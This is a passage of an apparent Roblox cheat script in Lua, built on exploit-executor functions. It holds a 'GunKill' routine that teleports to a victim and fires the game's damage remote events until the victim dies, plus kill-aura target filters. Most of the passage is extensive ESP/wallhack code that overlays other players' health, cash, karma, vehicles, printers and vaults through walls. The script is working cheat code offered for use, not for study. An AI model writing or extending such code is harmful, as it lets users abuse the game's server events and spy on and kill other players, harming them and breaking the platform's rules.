            getrenv()._G.Triggered(LocalPlayer.Character.HumanoidRootPart,num,"")
        end
    end getgenv().mpibself = func8
    
    function func9(Player)
        m = Player.Character:FindFirstChildWhichIsA("Tool")
        if IsValid(Player) and m and m:FindFirstChild("Handle"):FindFirstChild("Reload") and m.Name ~= "Confetti Gun" and m.Name ~= "Beach Gun" then
            return true
        else
            return false
        end
    end getgenv().IsGun = func9
    
    function func10(Player)
        m = Player.Character:FindFirstChildWhichIsA("Tool")
        if IsValid(Player) and m and m:FindFirstChild("Handle"):FindFirstChild("Reload") and m.Name ~= "Confetti Gun" and m.Name ~= "Beach Gun" then
            return m
        else
            return nil
        end
    end getgenv().GetGun = func10
    
    function func11(Player)
        if Player.Character:FindFirstChildWhichIsA("Tool") then
            return true
        else
            return false
        end
    end getgenv().IsTool = func11
    
    function func12(Player)
        if IsValid(Player) then
            m = Player.Character:FindFirstChildWhichIsA("Tool")
            if m then
                return m
            else
                return nil
            end
        end
    end getgenv().GetTool = func12
    
    function func13(cframe, damage)
        spawn(function()
            
        end)
    end getgenv().HitMarker = func13
    
    function func27(Player)
        if not Player:IsFriendsWith(LocalPlayer.UserId) and var.FriendService then
            return false
        elseif Player:IsFriendsWith(LocalPlayer.UserId) and var.FriendService then
            return true
        end
    end getgenv().Friend = func27

    function func14(p6, p7)
        spawn(function()
            if p6 == nil then
                return;
            end;
            if p7 ~= nil then
                if p7 ~= 1 then
                    if p7 == 2 then
                        local v23 = l__BH__2:Clone();
                        if p7 == 2 then
                            v23.H1.Color = u3;
                            v23.B2.Color = u3;
                        end;
                        v23.CFrame = p6;
                        v23.Parent = game.Workspace.Particles;
                        v23.H1:Emit(14);
                        v23.B2:Emit(math.random(0, 3));
                        game.Debris:AddItem(v23, 5);
                        return;
                    end;
                else
                    v23 = l__BH__2:Clone();
                    if p7 == 2 then
                        v23.H1.Color = u3;
                        v23.B2.Color = u3;
                    end;
                    v23.CFrame = p6;
                    v23.Parent = game.Workspace.Particles;
                    v23.H1:Emit(14);
                    v23.B2:Emit(math.random(0, 3));
                    game.Debris:AddItem(v23, 5);
                    return;
                end;
            else
                v23 = l__BH__2:Clone();
                if p7 == 2 then
                    v23.H1.Color = u3;
                    v23.B2.Color = u3;
                end;
                v23.CFrame = p6;
                v23.Parent = game.Workspace.Particles;
                v23.H1:Emit(14);
                v23.B2:Emit(math.random(0, 3));
                game.Debris:AddItem(v23, 5);
                return;
            end;
            if p7 == "C" then
                local v24 = l__SamplesProj__4[p7 .. "H"]:Clone();
                v24.CFrame = p6;
                v24.Parent = game.Workspace.Particles;
                v24["1"]:Emit(3);
                v24["2"]:Emit(3);
                v24["3"]:Emit(3);
                v24["4"]:Emit(2);
                v24["5"]:Emit(8);
                game.Debris:AddItem(v24, 5);
                return;
            end;
            if p7 == "LMF" then
            else
                if p7 == 3 then
                    local v25 = l__BHM__5:Clone();
                    v25.CFrame = p6;
                    v25.Parent = game.Workspace.Particles;
                    v25.H1:Emit(7);
                    v25.H2:Emit(10);
                    getrenv()._G.Triggered(v25, 14, "a");
                    game.Debris:AddItem(v25, 5);
                end;
                return;
            end;
            local v26 = l__SamplesProj__4[p7]:Clone();
            v26.CFrame = p6;
            v26.Parent = game.Workspace.Particles;
            local v27, v28, v29 = pairs(v26:GetChildren());
            while true do
                local v30, v31 = v27(v28, v29);
                if v30 then
                else
                    break;
                end;
                v29 = v30;
                v31:Emit(v31.Rate);	
            end;
            game.Debris:AddItem(v26, 5);
        end)
    end; getgenv().CreateBulletHole = func14
    
    function func15(Player1, Player2, mag)
        if IsValid(Player1) and IsValid(Player2) and (Player1.Character.HumanoidRootPart.Position - Player2.Character.HumanoidRootPart.Position).magnitude <= mag then
            return true
        else
            return false
        end
    end getgenv().magnitudeplrs = func15
    
    function func26(Player)
        if IsValid(Player) then
            if not Player.Character:FindFirstChild("NameTag") then
                return "Purple"
            elseif Player.Character:FindFirstChild("NameTag") and Player.Character:FindFirstChild("NameTag"):FindFirstChild("TextLabel").TextColor3 == Color3.fromRGB(255,187,69) then
                return "Orange"
            elseif Player.Character:FindFirstChild("NameTag") and Player.Character:FindFirstChild("NameTag"):FindFirstChild("TextLabel").TextColor3 == Color3.fromRGB(112,186,255) then
                return "Blue"
            elseif Player.Character:FindFirstChild("NameTag") and Player.Character:FindFirstChild("NameTag"):FindFirstChild("TextLabel").TextColor3 == Color3.fromRGB(255,255,255) then
                return "White"
            elseif Player.Character:FindFirstChild("NameTag") and Player.Character:FindFirstChild("NameTag"):FindFirstChild("TextLabel").TextColor3 == Color3.fromRGB(255,33,33) then
                return "Red"
            end
        end
    end getgenv().GetColorName = func26

    function func69420(Player)
        if IsValid(Player) then
            if not Player.Character:FindFirstChild("NameTag") then
               return Color3.fromRGB(10,10,10)
            elseif Player.Character:FindFirstChild("NameTag") and Player.Character:FindFirstChild("NameTag").TextLabel.TextColor3 == Color3.fromRGB(255,187,69) then
                return Color3.fromRGB(255,187,69)
            elseif Player.Character:FindFirstChild("NameTag") and Player.Character:FindFirstChild("NameTag").TextLabel.TextColor3 == Color3.fromRGB(112,186,255) then
                return Color3.fromRGB(112,186,255)
            elseif Player.Character:FindFirstChild("NameTag") and Player.Character:FindFirstChild("NameTag").TextLabel.TextColor3 == Color3.fromRGB(255,255,255) then
                return Color3.fromRGB(0,128,0)
            elseif Player.Character:FindFirstChild("NameTag") and Player.Character:FindFirstChild("NameTag").TextLabel.TextColor3 == Color3.fromRGB(255,33,33) then
                return Color3.fromRGB(255,33,33)
            elseif not Player.Character:FindFirstChild("NameTag") then
                return Color3.fromRGB(10,10,10)
            end
        end        
    end getgenv().GetColor = func69420
    
    function func16(plr)
        if IsValid(plr) then
            if var.killauratargets == "Red Names" and GetColorName(plr) == "Red" then
                return true
            elseif var.killauratargets == "Yellow Names" and GetColorName(plr) == "Orange" and IsFlagged(LocalPlayer) then
                return true
            elseif var.killauratargets == "Both" and plr.Flagged.Value then
                return true
            else
                return false
            end
        end
    end getgenv().canbekilled = func16
    
    function func17()
        if LocalPlayer.Job.Value ~= "Soldier" and LocalPlayer.Job.Value ~= "Mayor" and LocalPlayer.Job.Value ~= "Detective" and LocalPlayer.Job.Value ~= "Farmer" then
            if (IsSemiGodded(LocalPlayer) and LocalPlayer.Flagged.Value) then
                game:GetService("ReplicatedStorage").Events.MenuActionEvent:FireServer(6,true)
            elseif not IsSemiGodded(LocalPlayer) then
                game:GetService("ReplicatedStorage").Events.MenuActionEvent:FireServer(6,true)
            elseif (IsSemiGodded(LocalPlayer) and not LocalPlayer.Flagged.Value) then
                senderror("You can't flag!")
                return nil
            end
        else
            senderror("You can't flag!")
            return nil
        end
    end getgenv().flagup = func17
    
    function func18(Player)
        if IsValid(Player) and Player.Flagged.Value then
            return true
        else
            return false
        end
    end getgenv().IsFlagged = func18
    
    function func20(Player)
        oldpos = LocalPlayer.Character:GetPivot()
        repeat Tween(Player.Character:GetPivot(), .1) wait(.153)
            flagup()
            game:GetService("ReplicatedStorage").Events.WeaponReloadEvent:FireServer(tostring(LocalPlayer.PlayerGui.Ammo.Frame.type.Text), 25, GetGun(LocalPlayer))
            wait(.01)
            game:GetService("ReplicatedStorage").Events.MenuActionEvent:FireServer(33, Player.Character:GetPivot(), 2,Player.Character:WaitForChild("Humanoid"), 50, GetGun(LocalPlayer), nil, 1)
            CreateBulletHole(Player.Character:GetPivot(),2)
            HitMarker(Player.Character:GetPivot(), GetGun(LocalPlayer):GetAttribute("Damage"))
        until Player.Character.Health == 0 or not IsValid(Player) or Player == nil or var.unbreakkill or not IsGun(LocalPlayer)
        LocalPlayer.Character:PivotTo(oldpos)
    end getgenv().GunKill = func20
    
    function func21(Player)
        senderror("patched")
    end getgenv().MeleeKill = func21

    function ischammed(property)
        for i,v in ipairs(chams:GetChildren()) do
            if v.Adornee and v.Adornee == property then
                return true
            end 
        end
        return false
    end

    function deletecham(property)
        for i,v in ipairs(chams:GetChildren()) do
            if v.Adornee and v.Adornee == property then
                v:Destroy()
            end 
        end
    end

    function enespcham(BodyPart,findname,size,color)
        coroutine.wrap(function()
            local Box = Instance.new("BoxHandleAdornment")
            Box.Size = BodyPart.Size + size
            Box.Name = tostring(findname)
            Box.Adornee = BodyPart
            Box.Color3 = color
            Box.AlwaysOnTop = true
            Box.ZIndex = 1
            Box.Transparency = 0.5
            Box.Parent = chams
        end)()
    end
    
    function enesp(prop,j)
            coroutine.wrap(function()
                LocalPlayer:RequestStreamAroundAsync(prop:GetPivot().p)
                if j then
                	workspace:WaitForChild(tostring(prop),math.huge):WaitForChild("HumanoidRootPart",math.huge).Parent:WaitForChild("Humanoid",math.huge)
                end 
                if prop:FindFirstChildWhichIsA("Humanoid") and Players:GetPlayerFromCharacter(prop) ~= LocalPlayer and prop:FindFirstChild("HumanoidRootPart") and j and prop ~= nil and var.playeresp and not ischammed(prop:WaitForChild("HumanoidRootPart")) and Players[tostring(prop)].Character ~= nil then
                        local TextLabel = Drawing.new("Text")
                        local TextLabel_2 = Drawing.new("Text")
                        local tracer = Drawing.new("Line")
                        local plr = Players:GetPlayerFromCharacter(prop)
                        local Box = Instance.new("BoxHandleAdornment")
                        Box.Size = prop:WaitForChild("HumanoidRootPart").Size + Vector3.new(3,5,3)
                        Box.Name = "player"
                        Box.Adornee = prop:WaitForChild("HumanoidRootPart")
                        Box.AlwaysOnTop = true
                        Box.ZIndex = 1
                        Box.Transparency = 0.5
                        Box.Parent = chams
                        TextLabel_2.Visible = true
                        TextLabel_2.Outline = true
                        TextLabel_2.Center = true
                        TextLabel_2.Size = var.playerespsize
                        TextLabel_2.Font = Drawing.Fonts.System
                        TextLabel_2.ZIndex = 2
                        TextLabel_2.Text = (tostring(plr) or "you shouldn't see this [report to sawd#8020]")
                        TextLabel_2.Outline = true
                        TextLabel.Outline = true
                        TextLabel.Size = var.playerespsize
                        TextLabel.Font = Drawing.Fonts.System
                        TextLabel.Color = Color3.fromRGB(200,200,200)
                        TextLabel.ZIndex = 1
                        TextLabel.Center = true
                        TextLabel.Visible = true
                        local g
                        local m
                        local function f()
                        	g:Disconnect()
                            TextLabel:Remove()
                            TextLabel_2:Remove()
                            tracer:Remove()
                            Box:Destroy()
                            m:Disconnect()
                        end
                        m = Players.PlayerRemoving:Connect(function(v)
                            if v == plr then
                                f()
                            end 
                        end)
                        table.insert(destroyesp,TextLabel)table.insert(destroyesp,TextLabel_2)
                        g = game:GetService("RunService").RenderStepped:Connect(function()
                        	workspace:WaitForChild(tostring(plr)):WaitForChild("Humanoid")
                        	if plr.Character:FindFirstChildWhichIsA("Humanoid").Health ~= 0 then
                                tracer.Visible = var.Tracers
								TextLabel.Visible = var.playeresp
								TextLabel_2.Visible = var.playeresp
                                Box.Visible = PESPChams
							else
								tracer.Visible = false
								TextLabel.Visible = false
								TextLabel_2.Visible = false
								Box.Visible = false	
							end
                        	Box.Adornee = plr.Character
                            if not var.playeresp then
                                f()
                            end
                            local _,vis = workspace.Camera:WorldToScreenPoint(workspace:WaitForChild(tostring(plr)):GetPivot().p or CFrame.new(0,0,0))
                            local j = workspace.Camera:WorldToViewportPoint(workspace:WaitForChild(tostring(plr)):WaitForChild("Head"):GetPivot().p or CFrame.new(0,0,0))
                            if vis and TextLabel then
                                pcall(function()
                                    TextLabel.Visible = true
                                    TextLabel_2.Visible = true
                                    if var.Tracers then
                                        tracer.Visible = true
                                    else
                                        tracer.Visible = false
                                    end
                                    if var.tracertype == "Bottom" then
                                        tracer.From = Vector2.new(workspace.Camera.ViewportSize.X / 1.9, workspace.Camera.ViewportSize.Y)
                                    else 
                                        tracer.From = Vector2.new(game:GetService("UserInputService"):GetMouseLocation().x,game:GetService("UserInputService"):GetMouseLocation().y)
                                    end
                                end)
                            else
                                pcall(function()
                                    TextLabel.Visible = false
                                    TextLabel_2.Visible = false
                                    tracer.Visible= false
                                end)
                            end
                            if table.find(pianousers,tostring(plr)) then
                                TextLabel_2.Text = tostring(plr).." [Piano User]"
                            end
                            tracer.To= Vector2.new(j.x,j.y)
                            TextLabel_2.Color = GetColor(plr) or Color3.fromRGB(10,10,10)
                            tracer.Color = GetColor(plr) or Color3.fromRGB(10,10,10)
                            tracer.Thickness = 1.5
                            TextLabel_2.Position = Vector2.new(j.x,j.y+(-3-var.playerespsize))
                            TextLabel.Position = Vector2.new(j.x,j.y)
                            TextLabel.Text = "Health: ["..math.floor(plr.Character:WaitForChild("Humanoid").Health+.5).."/"..plr.Character:WaitForChild("Humanoid").MaxHealth.."] Tool: "
                            ..tostring(plr.Character:FindFirstChildWhichIsA("Tool")).."\nKarma: "
                            ..plr.PlayerData.Karma.Value.." | Guarding For: "..tostring(plr.GuardSettings.GuardingFor.Value).."\nJob: "
                            ..plr.Job.Value.." | Distance: "
                            ..math.floor((LocalPlayer.Character:GetPivot().p - plr.Character:GetPivot().p).magnitude).."\nCash: "..plr.PlayerData.Currency.Value.." | Aureus: "..plr.PlayerData.PCurrency.Value
                            TextLabel.Size = var.playerespsize
                            TextLabel_2.Size = var.playerespsize
                            Box.Color3 = GetColor(plr) or Color3.fromRGB(10,10,10)
                        end)
                end
                if not prop.Name:find("Banker") and prop:FindFirstChildWhichIsA("MeshPart") and not prop:GetFullName():find("Vehicles") and not prop:FindFirstChildWhichIsA("MeshPart").Name ~= "Box" and prop.Name ~= "LootCrate" and j == nil then
                    repeat game:GetService("RunService").RenderStepped:wait() until prop == nil or prop:FindFirstChild("Int") or prop:FindFirstChild("Int2")
                end
                if var.lootesp and prop.Name == "LootCrate" and prop ~= nil and prop:FindFirstChildWhichIsA("MeshPart") and not ischammed(prop) then
                    enespcham(prop:FindFirstChildWhichIsA("MeshPart"),"loot",Vector3.new(.2,.2,.2),prop:FindFirstChildWhichIsA("MeshPart").Color)
                    local TextLabel = Drawing.new("Text")
                    local tracer = Drawing.new("Line")
                    TextLabel.Outline = true
                    TextLabel.Size = var.lootespsize
                    TextLabel.Font = Drawing.Fonts.System
                    TextLabel.Color = Color3.fromRGB(255,255,255)
                    TextLabel.ZIndex = 1
                    TextLabel.Center = true
                    TextLabel.Visible = true
                    TextLabel.Text = "Lootcrate"
                    local j
                    local m
                    pcall(function()
                        m = game:GetService("Workspace"):FindFirstChild("Loot").ChildRemoved:Connect(function(b)
                            if b== prop then
                                m:Disconnect()
                                j:Disconnect()
                                TextLabel:Remove()
                                tracer:Remove()
                                deletecham(prop)
                            end
                        end)
                    end)
                    j = game:GetService("RunService").RenderStepped:Connect(function()
                        if var.lootesp == false or not game:GetService("Workspace"):FindFirstChild("Loot") then
                            m:Disconnect()
                            j:Disconnect()
                            TextLabel:Remove()
                            tracer:Remove()
                            deletecham(prop)
                        end
                        local _,vis = workspace.Camera:WorldToScreenPoint(prop:GetPivot().p or CFrame.new(0,0,0))
                        local g = workspace.Camera:WorldToViewportPoint(prop:GetPivot().p or CFrame.new(0,0,0))
                        TextLabel.Size = var.lootespsize
                        if vis then
                            TextLabel.Visible = true
                            if var.Tracers then
                                tracer.Visible = true
                            else
                                tracer.Visible = false
                            end
                            if var.tracertype == "Bottom" then
                                tracer.From = Vector2.new(workspace.Camera.ViewportSize.X / 1.9, workspace.Camera.ViewportSize.Y)
                            else 
                                tracer.From = Vector2.new(game:GetService("UserInputService"):GetMouseLocation().x,game:GetService("UserInputService"):GetMouseLocation().y)
                            end
                        else
                            TextLabel.Visible = false
                            tracer.Visible= false
                        end
                        tracer.To= Vector2.new(g.x,g.y)
                        tracer.Color = prop:FindFirstChildWhichIsA("MeshPart").Color
                        tracer.Thickness = 1.5
                        TextLabel.Position = Vector2.new(g.x,g.y)
                    end)
                end
                if var.caresp and prop ~= nil and prop:GetFullName():find("Vehicles") and not ischammed(prop) and prop:FindFirstChildWhichIsA("MeshPart") then
                    for i,v in ipairs(prop:GetChildren()) do
                        if v.Name:find("MeshPart") then
                            enespcham(v,"vehicle",Vector3.new(2,2,2),Color3.fromRGB(20,20,150))
                            local TextLabel = Drawing.new("Text")
                            local tracer = Drawing.new("Line")
                            local j
                            local m
                            TextLabel.Outline = true
                            TextLabel.Size = var.lootespsize
                            TextLabel.Font = Drawing.Fonts.System
                            TextLabel.Color = Color3.fromRGB(255,255,255)
                            TextLabel.ZIndex = 1
                            TextLabel.Center = true
                            TextLabel.Visible = true
                            m = game:GetService("Workspace"):FindFirstChild("Vehicles").ChildRemoved:Connect(function(v2)
                                if v2 == prop then
                                    j:Disconnect()
                                    m:Disconnect()
                                    TextLabel:Remove()
                                    tracer:Remove()
                                    deletecham(prop)
                                end
                            end)
                            j = game:GetService("RunService").RenderStepped:Connect(function()
                                local _,vis = workspace.Camera:WorldToScreenPoint(prop:GetPivot().p or CFrame.new(0,0,0))
                                local g = workspace.Camera:WorldToViewportPoint(prop:GetPivot().p or CFrame.new(0,0,0))
                                if vis then
                                    TextLabel.Visible = true
                                    if var.Tracers then
                                        tracer.Visible = true
                                    else
                                        tracer.Visible = false
                                    end
                                    if var.tracertype == "Bottom" then
                                        tracer.From = Vector2.new(workspace.Camera.ViewportSize.X / 1.9, workspace.Camera.ViewportSize.Y)
                                    else 
                                        tracer.From = Vector2.new(game:GetService("UserInputService"):GetMouseLocation().x,game:GetService("UserInputService"):GetMouseLocation().y)
                                    end
                                else
                                    TextLabel.Visible = false
                                    tracer.Visible= false
                                end
                                tracer.To= Vector2.new(g.x,g.y)
                                tracer.Color = Color3.fromRGB(20,20,150)
                                tracer.Thickness = 1.5
                                TextLabel.Position = Vector2.new(g.x,g.y)
                                TextLabel.Text = tostring(prop:FindFirstChild("TrueOwner").Value).."'s  "..tostring(prop.Name).."\nLocked: "..tostring(prop:FindFirstChild("TrueOwner"):FindFirstChild("Locked").Value).." | Seats Locked: "..tostring(prop:FindFirstChild("SeatLocks").Value).."\nHeadlights: "..tostring(prop:FindFirstChild("LightsToggle").Value).." | Seats: "..tostring(#prop:FindFirstChild("Seats"):GetChildren() + 1)
                                TextLabel.Size = var.carespsize
                                if var.caresp == false then
                                    j:Disconnect()
                                    m:Disconnect()
                                    TextLabel:Remove()
                                    tracer:Remove()
                                    deletecham(prop)
                                end
                            end)
                        end
                    end
                end
                if var.entesp and prop ~= nil and prop.Name == "Gun" and not ischammed(prop) then
                    if prop:FindFirstChildOfClass("MeshPart") then
                        enespcham(prop:FindFirstChildOfClass("MeshPart"),"entity",Vector3.new(.2,.2,.2),Color3.fromRGB(210,5,5))
                    elseif not prop:FindFirstChildWhichIsA("MeshPart") and prop:FindFirstChildWhichIsA("BasePart") then
                        enespcham(prop:FindFirstChildWhichIsA("BasePart"),"entity",Vector3.new(.2,.2,.2),Color3.fromRGB(210,5,5))
                    end
                    coroutine.wrap(function()
                        local TextLabel = Drawing.new("Text")
                        local tracer = Drawing.new("Line")
                        TextLabel.Size = var.etnespsize
                        TextLabel.Font = Drawing.Fonts.System
                        TextLabel.Color = Color3.fromRGB(255,255,255)
                        TextLabel.ZIndex = 1
                        TextLabel.Text = prop:WaitForChild("Int").Value
                        TextLabel.Visible = true
                        TextLabel.Center = true
                        TextLabel.Outline = true
                        local g
                        local m
                        m = workspace.Entities.ChildRemoved:Connect(function(p)
                            if p == prop then
                                TextLabel:Remove()
                                g:Disconnect()
                                m:Disconnect()
                                tracer:Remove()
                                deletecham(prop)
                            end 
                        end)
                        g = game:GetService("RunService").RenderStepped:Connect(function()
                            pcall(function()
                                local _,vis = workspace.Camera:WorldToScreenPoint(prop:GetPivot().p or CFrame.new(0,0,0))
                                local j = workspace.Camera:WorldToViewportPoint(prop:GetPivot().p or CFrame.new(0,0,0))
                                if not var.entesp then
                                    g:Disconnect()
                                end 
                                if vis then
                                    TextLabel.Visible = true
                                    if var.Tracers then
                                        tracer.Visible = true
                                    else
                                        tracer.Visible = false
                                    end
                                    if var.tracertype == "Bottom" then
                                        tracer.From = Vector2.new(workspace.Camera.ViewportSize.X / 1.9, workspace.Camera.ViewportSize.Y)
                                    else 
                                        tracer.From = Vector2.new(game:GetService("UserInputService"):GetMouseLocation().x,game:GetService("UserInputService"):GetMouseLocation().y)
                                    end
                                else
                                    TextLabel.Visible = false
                                    tracer.Visible= false
                                end
                                tracer.To= Vector2.new(j.x,j.y)
                                tracer.Color = Color3.fromRGB(210,5,5)
                                tracer.Thickness = 1.5
                                TextLabel.Position = Vector2.new(j.x,j.y)
                                TextLabel.Size = var.etnespsize
                                if var.entesp == false then
                                    g:Disconnect()
                                    TextLabel:Remove()
                                    tracer:Remove()
                                    deletecham(prop)
                                    m:Disconnect()
                                end
                            end)
                        end)
                    end)()
                elseif var.entesp and prop ~= nil and prop.Name:find("Shipment") and prop:FindFirstChild("MeshPart") and not ischammed(prop) then
                    enespcham(prop:FindFirstChild("MeshPart"),"entity",Vector3.new(.2,.2,.2),prop:FindFirstChild("MeshPart").Color)
                    coroutine.wrap(function()
                        local TextLabel = Drawing.new("Text")
                        local tracer = Drawing.new("Line")
                        TextLabel.Size = var.etnespsize
                        TextLabel.Font = Drawing.Fonts.System
                        TextLabel.Color = Color3.fromRGB(255,255,255)
                        TextLabel.ZIndex = 1
                        TextLabel.Center = true
                        TextLabel.Visible = true
                        TextLabel.Outline = true
                        local g
                        local m
                        m = workspace.Entities.ChildRemoved:Connect(function(e)
                            if e == prop then
                                g:Disconnect()
                                TextLabel:Remove()
                                tracer:Remove()
                                m:Disconnect()
                                deletecham(prop)
                            end
                        end)
                        g = game:GetService("RunService").RenderStepped:Connect(function()
                            local _,vis = workspace.Camera:WorldToScreenPoint(prop:GetPivot().p)
                            local j = workspace.Camera:WorldToViewportPoint(prop:GetPivot().p)
                            if not var.entesp then
                                g:Disconnect()
                                TextLabel:Remove()
                                tracer:Remove()
                                m:Disconnect()
                                deletecham(prop)
                            end 
                            if vis then
                                TextLabel.Visible = true
                                if var.Tracers then
                                    tracer.Visible = true
                                else
                                    tracer.Visible = false
                                end
                                if var.tracertype == "Bottom" then
                                    tracer.From = Vector2.new(workspace.Camera.ViewportSize.X / 1.9, workspace.Camera.ViewportSize.Y)
                                else 
                                    tracer.From = Vector2.new(game:GetService("UserInputService"):GetMouseLocation().x,game:GetService("UserInputService"):GetMouseLocation().y)
                                end
                            else
                                TextLabel.Visible = false
                                tracer.Visible= false
                            end
                            tracer.To = Vector2.new(j.x,j.y)
                            tracer.Color = prop:FindFirstChild("MeshPart").Color
                            tracer.Thickness = 1.5
                            TextLabel.Position = Vector2.new(j.x,j.y)
                            TextLabel.Size = var.etnespsize
                            TextLabel.Text = tostring(prop:FindFirstChild("TrueOwner").Value).."'s "..tostring(prop.Name).."\nLocked: "..tostring(prop:FindFirstChild("TrueOwner"):FindFirstChild("Locked").Value).." | Uses: "..(prop:FindFirstChild("Int") or prop:FindFirstChild("Int2")):FindFirstChild("Uses").Value
                        end)
                    end)()
                elseif var.entesp and prop ~= nil and prop.Name:find("Banker") and prop:FindFirstChild("Part") and not ischammed(prop) then
                    for i,v in ipairs(prop:GetChildren()) do
                        if not v:FindFirstChild("Mesh") and v.Name ~= "Main" and v.Name == "Part" then
                            enespcham(v,"entity",Vector3.new(.2,.2,.9),v.Color)
                            local TextLabel = Drawing.new("Text")
                            local tracer = Drawing.new("Line")
                            TextLabel.Size = var.etnespsize
                            TextLabel.Font = Drawing.Fonts.System
                            TextLabel.Color = Color3.fromRGB(255,255,255)
                            TextLabel.ZIndex = 1
                            TextLabel.Center = true
                            TextLabel.Visible = true
                            TextLabel.Outline = true
                            TextLabel.Text = tostring(prop.Parent.Name).."'s Banker Vault"
                            local l
                            local j
                            l = prop.Parent.ChildRemoved:Connect(function(g)
                                if g == prop then
                                    j:Disconnect()
                                    l:Disconnect()
                                    deletecham(prop)
                                end
                            end)
                            j = game:GetService("RunService").RenderStepped:Connect(function()
                                TextLabel.Size = var.etnespsize
                                local _,vis = workspace.Camera:WorldToScreenPoint(prop:GetPivot().p or CFrame.new(0,0,0))
                                local g = workspace.Camera:WorldToViewportPoint(prop:GetPivot().p or CFrame.new(0,0,0))
                                if vis then
                                    TextLabel.Visible = true
                                    if var.Tracers then
                                        tracer.Visible = true
                                    else
                                        tracer.Visible = false
                                    end
                                    if var.tracertype == "Bottom" then
                                        tracer.From = Vector2.new(workspace.Camera.ViewportSize.X / 1.9, workspace.Camera.ViewportSize.Y)
                                    else 
                                        tracer.From = Vector2.new(game:GetService("UserInputService"):GetMouseLocation().x,game:GetService("UserInputService"):GetMouseLocation().y)
                                    end
                                else
                                    TextLabel.Visible = false
                                    tracer.Visible= false
                                end
                                tracer.To= Vector2.new(g.x,g.y)
                                tracer.Color = v.Color
                                tracer.Thickness = 1.5
                                TextLabel.Position = Vector2.new(g.x,g.y)
                                if var.entesp == false then
                                    j:Disconnect()
                                    l:Disconnect()
                                    tracer:Remove()
                                    TextLabel:Remove()
                                    deletecham(prop)
                                end
                            end)
                            break
                        end
                    end
                elseif var.printeresp and prop ~= nil and prop.Name:find("Money Printer") and prop:FindFirstChild("Main") and not ischammed(prop) then
                    enespcham(prop:FindFirstChild("Main"),"printer",Vector3.new(.2,.2,.2),prop:FindFirstChild("Main").Color)
                    coroutine.wrap(function()
                        local TextLabel = Drawing.new("Text")
                        local tracer = Drawing.new("Line")
                        TextLabel.Size = var.printespsize
                        TextLabel.Font = Drawing.Fonts.System
                        TextLabel.Color = Color3.fromRGB(255,255,255)
                        TextLabel.ZIndex = 1
                        TextLabel.Center = true
                        TextLabel.Visible = true
                        TextLabel.Outline = true
                        local g
                        local m
                        m = workspace.MoneyPrinters.ChildRemoved:Connect(function(p)
                            if p == prop then
                                m:Disconnect()
                                TextLabel:Remove()
                                g:Disconnect()
                                tracer:Remove()
                                deletecham(prop)
                            end
                        end)
                        g = game:GetService("RunService").RenderStepped:Connect(function()
                            pcall(function()
                                local _,vis = workspace.Camera:WorldToScreenPoint(prop:GetPivot().p or CFrame.new(0,0,0))
                                local j = workspace.Camera:WorldToViewportPoint(prop:GetPivot().p or CFrame.new(0,0,0))
                                if not var.printeresp then
                                    m:Disconnect()
                                    TextLabel:Remove()
                                    g:Disconnect()
                                    tracer:Remove()
                                    deletecham(prop)
                                end 
                                if vis then
                                    TextLabel.Visible = true
                                    if var.Tracers then
                                        tracer.Visible = true
                                    else
                                        tracer.Visible = false
                                    end
                                    if var.tracertype == "Bottom" then
                                        tracer.From = Vector2.new(workspace.Camera.ViewportSize.X / 1.9, workspace.Camera.ViewportSize.Y)
                                    else 
                                        tracer.From = Vector2.new(game:GetService("UserInputService"):GetMouseLocation().x,game:GetService("UserInputService"):GetMouseLocation().y)
                                    end
                                else
                                    TextLabel.Visible = false
                                    tracer.Visible= false
                                end
                                tracer.To= Vector2.new(j.x,j.y)
                                tracer.Color = prop:FindFirstChild("Main").Color
                                tracer.Thickness = 1.5
                                TextLabel.Position = Vector2.new(j.x,j.y)
                                TextLabel.Text = tostring(prop:FindFirstChild("TrueOwner").Value).."'s "..prop.Name:split(" ")[3].." Printer\nLocked: "..tostring(prop:FindFirstChild("TrueOwner"):FindFirstChild("Locked").Value).." | Uses: "..prop:FindFirstChild("Int"):FindFirstChild("Uses").Value.." | Money: "..prop:FindFirstChild("Int"):FindFirstChild("Money").Value
                                TextLabel.Size = var.printespsize
                            end)
                        end)
                    end)()
                elseif var.matesp and prop ~= nil and prop:GetFullName():find("Materials") and prop:FindFirstChild("Part") and not ischammed(prop) then
                    for i,v in ipairs(prop:GetChildren()) do
                        if not v:FindFirstChildWhichIsA("ManualWeld") and v:IsA("BasePart") then
                            enespcham(v,"entity",Vector3.new(.2,.49,.2),v.Color)
                            coroutine.wrap(function()
                                local TextLabel = Drawing.new("Text")
                                local tracer = Drawing.new("Line")
                                TextLabel.Size = var.matespsize
                                TextLabel.Font = Drawing.Fonts.System
                                TextLabel.Color = Color3.fromRGB(255,255,255)
                                TextLabel.ZIndex = 1
                                TextLabel.Center = true
                                TextLabel.Visible = true
                                TextLabel.Outline = true
                                local g
                                local m
                                m = game:GetService("Workspace"):FindFirstChild("Materials").ChildRemoved:Connect(function()
                                    m:Disconnect()
                                    TextLabel:Remove()
                                    tracer:Remove()
                                    g:Disconnect()
                                    deletecham(prop)
                                end)
                                g = game:GetService("RunService").RenderStepped:Connect(function()
                                    pcall(function()
                                        local _,vis = workspace.Camera:WorldToScreenPoint(prop:GetPivot().p or CFrame.new(0,0,0))
                                        local j = workspace.Camera:WorldToViewportPoint(prop:GetPivot().p or CFrame.new(0,0,0))
                                        if not var.matesp then
                                            m:Disconnect()
                                            TextLabel:Remove()
                                            g:Disconnect()
                                            tracer:Remove()
                                            deletecham(prop)
                                        end 
                                        if vis then
                                            TextLabel.Visible = true
                                            if var.Tracers then
                                                tracer.Visible = true
                                            else
                                                tracer.Visible = false
                                            end
                                            if var.tracertype == "Bottom" then
                                                tracer.From = Vector2.new(workspace.Camera.ViewportSize.X / 1.9, workspace.Camera.ViewportSize.Y)
                                            else 
                                                tracer.From = Vector2.new(game:GetService("UserInputService"):GetMouseLocation().x,game:GetService("UserInputService"):GetMouseLocation().y)
                                            end
                                        else
                                            TextLabel.Visible = false
                                            tracer.Visible= false
                                        end
                                        tracer.To = Vector2.new(j.x,j.y)
                                        tracer.Color = v.Color
                                        tracer.Thickness = 1.5
                                        TextLabel.Position = Vector2.new(j.x,j.y)
                                        TextLabel.Text = tostring(prop:FindFirstChild("TrueOwner").Value).."'s "..prop.Name.."\nLocked: "..tostring(prop:FindFirstChild("TrueOwner"):FindFirstChild("Locked").Value)
                                        TextLabel.Size = var.matespsize
                                    end)
                                end)
                            end)()
                        end
                    end
                end
            end)()
    end

    function save()
        local j = "local saves = {"
        for i,v in pairs(var) do
            if typeof(v) == "number" then
                j=j..i.."="..v..";\n"
            elseif typeof(v) == "boolean" or typeof(v) == "EnumItem" and i~=var.IG and i~=var.dpfarm and i~=var.materialfarm then
